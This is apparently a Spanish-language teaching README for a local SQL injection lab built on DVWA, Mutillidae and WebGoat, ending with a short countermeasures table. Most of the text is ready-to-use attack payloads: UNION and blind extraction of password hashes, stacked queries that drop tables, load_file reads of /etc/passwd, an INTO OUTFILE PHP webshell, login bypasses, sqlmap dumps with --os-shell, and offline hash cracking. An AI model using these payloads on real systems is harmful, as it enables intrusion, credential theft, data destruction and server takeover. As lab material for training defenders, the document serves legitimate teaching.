# SQL Injection Lab

## Labs disponibles

| Servicio    | URL                                    | Credenciales                  |
|-------------|----------------------------------------|-------------------------------|
| DVWA        | http://localhost:80                    | admin / password              |
| Mutillidae  | http://localhost:8081                  | (sin login requerido)         |
| WebGoat     | http://localhost:8080/WebGoat          | Crear usuario en primer acceso|

## Setup

```bash
# Iniciar todos los labs
docker compose up -d

# DVWA: esperar ~30s, abrir http://localhost → admin / password → "Create / Reset Database"

# Parar los labs
docker compose down

# Parar y eliminar todos los datos
docker compose down -v
```

---

## Taxonomía de ataques SQL Injection

```
SQLi
├── In-band (resultado visible en la respuesta)
│   ├── Error-based       — el error del motor revela datos
│   └── UNION-based       — se añade un SELECT propio a la consulta
├── Blind (no hay salida directa)
│   ├── Boolean-based     — la app responde diferente según true/false
│   └── Time-based        — se mide el tiempo de respuesta (SLEEP/BENCHMARK)
├── Out-of-band           — los datos se exfiltran por DNS/HTTP
└── Técnicas auxiliares
    ├── Stacked queries   — se encadenan varias sentencias (;)
    ├── Second-order      — el payload se almacena y ejecuta después
    └── File R/W          — LOAD_FILE / INTO OUTFILE
```

---

## DVWA

### Security Level: LOW

Navegar a **DVWA → SQL Injection** y fijar Security Level en **Low**.

#### 1. Tautología — volcar todos los usuarios
```
1' OR '1'='1
```
La cláusula WHERE se vuelve siempre verdadera → devuelve todos los registros.

#### 2. UNION-based — extraer hashes de contraseñas
```
1' UNION SELECT user,password FROM users--
```
Paso previo obligatorio — descubrir número de columnas:
```
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--   ← error: la consulta tiene 2 columnas
```

#### 3. UNION-based — fingerprint del servidor
```
1' UNION SELECT version(),database()--
1' UNION SELECT user(),@@datadir--
```

#### 4. Enumerar bases de datos
```
1' UNION SELECT schema_name,null FROM information_schema.schemata--
```

#### 5. Enumerar tablas
```
1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()--
```

#### 6. Enumerar columnas
```
1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--
```

#### 7. Error-based — extraer datos vía error de sintaxis
```
1' AND extractvalue(1,concat(0x7e,(SELECT version())))--
1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
```
MySQL devuelve el resultado dentro del mensaje de error.

#### 8. Boolean-based blind — detectar inyección sin salida visible
```
1' AND 1=1--     ← respuesta normal
1' AND 1=2--     ← respuesta vacía o diferente
```
Extraer datos carácter a carácter:
```
1' AND substring(version(),1,1)='5'--
1' AND ascii(substring((SELECT password FROM users LIMIT 0,1),1,1))>100--
```

#### 9. Time-based blind — cuando no hay diferencia visual
```
1' AND sleep(5)--              ← retraso confirma inyección
1' AND IF(1=1,sleep(5),0)--
1' AND IF(substring(version(),1,1)='5',sleep(3),0)--
```
Extraer contraseña de admin bit a bit:
```
1' AND IF(ascii(substring((SELECT password FROM users WHERE user='admin'),1,1))>100,sleep(3),0)--
```

#### 10. Stacked queries (si el driver lo permite)
```
1'; INSERT INTO users (user,password) VALUES ('hacker','hacked')--
1'; DROP TABLE guestbook--
```

#### 11. File read — leer archivos del servidor
```
1' UNION SELECT load_file('/etc/passwd'),null--
1' UNION SELECT load_file('/var/www/html/dvwa/config/config.inc.php'),null--
```
Requiere privilegio `FILE` y que `secure_file_priv` esté vacío.

#### 12. File write — escribir webshell
```
1' UNION SELECT "<?php system($_GET['cmd']); ?>",null INTO OUTFILE '/var/www/html/shell.php'--
```
Acceso posterior: `http://localhost/shell.php?cmd=id`

---

### Security Level: MEDIUM

El frontend usa un dropdown (evita inyección directa de cadenas).
El backend aplica `mysql_real_escape_string()` — las comillas se escapan.

**Bypass**: payload numérico, sin comillas:
```
1 OR 1=1
1 UNION SELECT user,password FROM users#
1 AND sleep(5)#
```
Interceptar la petición con Burp Suite y modificar el parámetro POST directamente.

---

### Security Level: HIGH

El input está en una página/sesión separada. La consulta añade `LIMIT 1`.

**Bypass**: comentar el LIMIT e iterar el offset:
```
1' UNION SELECT user,password FROM users LIMIT 1,1#
1' UNION SELECT user,password FROM users LIMIT 2,1#
```

---

### Security Level: LOW — SQLi Blind (módulo separado)

DVWA tiene un módulo **SQL Injection (Blind)** específico.

Boolean-based:
```
1' AND 1=1#          ← "User ID exists"
1' AND 1=2#          ← "User ID is MISSING"
1' AND (SELECT count(*) FROM users)>0#
```

Time-based:
```
1' AND sleep(5)#
1' AND IF((SELECT count(*) FROM users)>4,sleep(4),0)#
```

---

### Analysis — cómo cambian las defensas

| Level  | Input        | Escaping                    | Otros controles           |
|--------|-------------|------------------------------|---------------------------|
| Low    | Text field  | Ninguno                      | Ninguno                   |
| Medium | Dropdown    | `mysql_real_escape_string()` | Bloquea comillas simples  |
| High   | Session     | PDO prepared statements      | `LIMIT 1`, token CSRF     |

---

## Mutillidae (http://localhost:8081)

Navegar a **OWASP Top 10 → A1 Injection → SQLi — Extract Data → User Info**.
Nivel recomendado para empezar: **Security Level 0 (Hosed)**.

### 1. Bypass de login
En la página de login:
```
' OR 1=1--
admin'--
' OR 'x'='x
```

### 2. UNION-based — fingerprint
```
' UNION SELECT null,null,null,null,null--
' UNION SELECT version(),database(),user(),null,null--
```
Ajustar el número de `null` hasta que no haya error (indica el número de columnas).

### 3. Enumerar usuarios del sistema
```
' UNION SELECT null,user,password,null,null FROM accounts--
```

### 4. XSS almacenado vía SQLi (Second-order)
Registrar un usuario con nombre:
```
<script>alert('XSS via SQLi')</script>
```
El payload se guarda en BD y se refleja al listar usuarios.

### 5. Boolean-based blind
```
' AND 1=1--     ← página normal
' AND 1=2--     ← página diferente/vacía
' AND length(database())=9--
' AND substring(database(),1,1)='d'--
```

### 6. Time-based blind
```
' AND sleep(5)--
' AND IF(length(database())=9,sleep(4),0)--
```

### 7. Path Traversal + SQLi combinado
En el parámetro `page`:
```
../../../../../etc/passwd
```
Y en campos de formulario SQL:
```
' UNION SELECT load_file('/etc/passwd'),null,null,null,null--
```

### 8. HTTP Header injection
Mutillidae registra cabeceras en BD. Modificar con Burp:
```
User-Agent: ' OR 1=1--
X-Forwarded-For: 1' UNION SELECT version(),null--
```

---

## WebGoat (http://localhost:8080/WebGoat)

### Módulo: SQL Injection (Introduction)

#### Ejercicio: What is SQL?
Consulta directa para entender la estructura:
```sql
SELECT * FROM user_data WHERE first_name = 'John'
```

#### Ejercicio: DML (Data Manipulation Language)
```sql
UPDATE employees SET salary=9999999 WHERE first_name='John'
```

#### Ejercicio: String SQL injection
En el campo de nombre:
```
Smith' OR '1'='1
```

#### Ejercicio: Numeric SQL injection
En campos numéricos sin comillas:
```
1 OR 1=1
```

#### Ejercicio: Compromising confidentiality — extraer toda la tabla
```
' OR 1=1--
' UNION SELECT null,null,null,null,null,null,null FROM user_data--
' UNION SELECT userid,user_name,password,cookie,null,null,null FROM user_data--
```

#### Ejercicio: Compromising integrity — modificar datos
```
'; UPDATE employees SET salary=999999 WHERE last_name='Smith'--
```

#### Ejercicio: Compromising availability — borrar registros de auditoría
```
'; DROP TABLE access_log--
```

---

### Módulo: SQL Injection (Advanced)

#### Blind SQL Injection — extraer contraseña de Tom
Confirmar inyección:
```
Smith' AND 1=1--      ← resultado normal
Smith' AND 1=2--      ← sin resultados
```
Extraer contraseña carácter a carácter:
```
Smith' AND substring((SELECT password FROM users WHERE user_name='Tom'),1,1)='t'--
Smith' AND ascii(substring((SELECT password FROM users WHERE user_name='Tom'),1,1))=116--
```

#### UNION-based — listar todas las cuentas
```
' UNION SELECT null,null,null,null,null,null,null,null FROM user_system_data--
' UNION SELECT userid,user_name,password,cookie,null,null,null,null FROM user_system_data--
```

---

## Automatización con sqlmap

Una vez confirmada la inyección manualmente, `sqlmap` automatiza la extracción completa.

```bash
# Detección básica
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session>;security=low"

# Volcar base de datos actual
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session>;security=low" \
       --current-db --dump

# Volcar tabla específica
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session>;security=low" \
       -D dvwa -T users --dump

# Forzar técnica time-based blind
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session>;security=low" \
       --technique=T --dump

# Intentar obtener shell interactiva
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session>;security=low" \
       --os-shell
```

---

## Crack de hashes (offline)

```bash
# MD5 — hash del usuario por defecto de DVWA
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
# Resultado: password

# Con john
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
john hashes.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Prevención — contramedidas a demostrar en clase

| Ataque               | Contramedida                                               |
|---------------------|------------------------------------------------------------|
| Classic / UNION     | Prepared statements / parametrized queries                 |
| Error-based         | Desactivar errores detallados en producción                |
| Boolean/Time blind  | WAF + rate limiting                                        |
| Stacked queries     | Usar APIs que no permiten múltiples sentencias             |
| File R/W            | Revocar privilegio FILE; `secure_file_priv` en MySQL       |
| Auth bypass         | ORM con queries tipadas; nunca concatenar input de usuario |
| Second-order        | Sanitizar también al leer de BD, no solo al escribir       |

---

## Cleanup

```bash
docker compose down -v   # elimina contenedores + volumen de BD
```
